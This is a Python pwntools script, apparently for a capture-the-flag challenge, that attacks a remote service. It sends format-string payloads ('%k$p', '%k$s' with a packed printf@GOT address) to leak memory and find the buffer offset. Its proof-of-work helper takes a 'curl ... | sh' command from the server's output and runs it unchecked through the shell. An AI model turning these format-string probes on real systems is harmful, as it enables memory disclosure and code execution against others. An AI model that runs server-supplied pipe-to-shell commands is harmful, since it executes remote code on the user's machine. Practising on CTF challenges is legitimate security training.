#!/usr/bin/env python3
# probe_with_pwntools.py
# Tự động solve POW + gửi probes để leak printf@got và tìm k_buf
# Yêu cầu: pip3 install pwntools

from pwn import remote
import subprocess, re, struct, time, sys

HOST = "pwn1.cscv.vn"
PORT = 6789
PRINTF_GOT = 0x404028

def solve_pow(sock, timeout=40):
    """
    Đọc đến 'proof of work:' rồi đọc dòng tiếp theo (pow command),
    chạy command, lấy solution (stdout first line) và gửi cho server.
    Trả về True nếu OK, False nếu fail.
    """
    try:
        data = sock.recvuntil(b'proof of work:', timeout=10)
    except Exception as e:
        print("[!] Timeout waiting for 'proof of work:' -", e)
        return False

    # đọc dòng tiếp theo (command)
    try:
        pow_line = sock.recvline(timeout=10).decode().strip()
    except Exception as e:
        print("[!] Timeout reading pow command line -", e)
        return False

    print("[*] POW line:", pow_line)
    m = re.search(r'(curl .*?\| *sh .*?$)', pow_line)
    cmd = m.group(1).strip() if m else pow_line
    if not cmd:
        print("[!] Không parse được POW command.")
        return False

    print("[*] Thực thi POW command để lấy solution (có thể mất vài giây)...")
    try:
        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True, timeout=30)
    except Exception as e:
        print("[!] Lỗi khi chạy POW command:", e)
        return False

    out = proc.stdout.strip()
    if not out:
        print("[!] POW runner không trả về solution. stderr:")
        print(proc.stderr)
        return False

    solution = out.splitlines()[0].strip()
    print("[*] POW solution (truncated):", solution[:120], "...")
    sock.sendline(solution.encode())
    return True

def connect_and_send(payload, recv_timeout=5, retries=3):
    for attempt in range(1, retries+1):
        try:
            print(f"[*] Connect attempt {attempt}...")
            r = remote(HOST, PORT, timeout=20)
            ok = solve_pow(r)
            if not ok:
                r.close()
                print("[!] POW fail on this connection, retrying...")
                time.sleep(1)
                continue

            # sau khi gửi solution, server in "Say something:"; chờ tới prompt ngắn rồi gửi payload
            try:
                pre = r.recvuntil(b"Say something:", timeout=10)
                # in một số output đầu để bạn kiểm tra
                print(pre.decode(errors='ignore'))
            except Exception as e:
                # có khi server trả prompt khác; vẫn tiếp tục
                pass

            r.send(payload)
            # đọc toàn bộ response (nhỏ) với timeout
            res = b""
            # đọc vài giây để gom output
            start = time.time()
            while True:
                try:
                    chunk = r.recv(timeout=1)
                    if not chunk:
                        break
                    res += chunk
                except Exception:
                    # no data right now
                    if time.time() - start > recv_timeout:
                        break
            r.close()
            return res.decode(errors='ignore')
        except Exception as e:
            print("[!] Connection error:", e)
            time.sleep(1)
            continue
    return None

def probe_printf_got():
    print("=== PHẦN 1: Probe printf@GOT với k = 1..20 ===")
    for k in range(1,21):
        fmt = f"|LEAK_{k}|%{k}$p|END_{k}|"
        payload = b"A" + fmt.encode() + struct.pack("<Q", PRINTF_GOT) + b"\n"
        out = connect_and_send(payload, recv_timeout=5, retries=3)
        print(f"--- k = {k} ---")
        if out is None:
            print("[!] No response after retries.")
        else:
            idx = out.find(f"|LEAK_{k}|")
            if idx >= 0:
                snippet = out[idx: idx+500]
                print(snippet)
            else:
                print(out[:500])
        print()

def find_k_buf_try_s():
    print("=== PHẦN 2A: Thử in %k$s (tìm k_buf) ===")
    for k in range(1,21):
        payload = f"MARK_{k}:%{k}$s:END\n".encode()
        out = connect_and_send(payload, recv_timeout=5, retries=3)
        print(f"--- k = {k} ---")
        if out is None:
            print("[!] No response.")
        else:
            idx = out.find(f"MARK_{k}:")
            if idx >= 0:
                print(out[idx: idx+300])
            else:
                print(out[:300])
        print()

def find_k_buf_try_p():
    print("=== PHẦN 2B: Thử in %k$p (in địa chỉ pointer) ===")
    for k in range(1,21):
        payload = f"K_{k}:%{k}$p:END\n".encode()
        out = connect_and_send(payload, recv_timeout=5, retries=3)
        print(f"--- k = {k} ---")
        if out is None:
            print("[!] No response.")
        else:
            idx = out.find(f"K_{k}:")
            if idx >= 0:
                print(out[idx: idx+300])
            else:
                print(out[:300])
        print()

if __name__ == "__main__":
    probe_printf_got()
    time.sleep(0.5)
    find_k_buf_try_s()
    time.sleep(0.5)
    find_k_buf_try_p()
    print("=== KẾT THÚC PROBE ===")
